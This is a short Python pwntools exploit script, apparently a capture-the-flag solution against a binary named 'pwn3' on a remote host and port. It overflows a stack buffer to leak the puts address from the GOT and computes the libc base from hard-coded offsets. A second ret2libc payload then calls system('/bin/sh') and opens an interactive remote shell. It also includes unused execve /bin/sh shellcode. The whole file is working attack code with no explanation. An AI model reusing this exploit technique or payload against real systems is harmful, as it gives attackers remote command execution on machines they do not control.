from pwn import *
context.log_level = 'DEBUG'

TARGET = './pwn3'
HOST = '104.154.106.182'
PORT = 4567

SHELLCODE = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

# r = process(TARGET)
r = remote(HOST, PORT)

gdb.attach(r, '''
c
''')
elf = ELF(TARGET)

r.recvuntil('desert')

payload = ''
payload += 'A' * 140
payload += p32(elf.sym['puts'])
payload += p32(elf.sym['main'])
payload += p32(elf.got['puts'])
r.sendline(payload)

leak = r.recvuntil('desert') 
leak_puts = u32(leak.split('\n')[1][0:4]) 
# leak_libc_start = u32(leak.split('\n')[1][8:12]) 
dbg("leak_puts")
# dbg("leak_libc_start")

base = leak_puts - 0x657e0# 0x5fca0
system = base + 0x40310# 0x3ada0
binsh = base + 0x162d4c#0x15ba0b

dbg("base")
dbg("system")
dbg("binsh")

payload = ''
payload += 'A' * 132
payload += p32(system)
payload += p32(0xdeadbeef)
payload += p32(binsh)
r.sendline(payload)

r.interactive()
r.close()
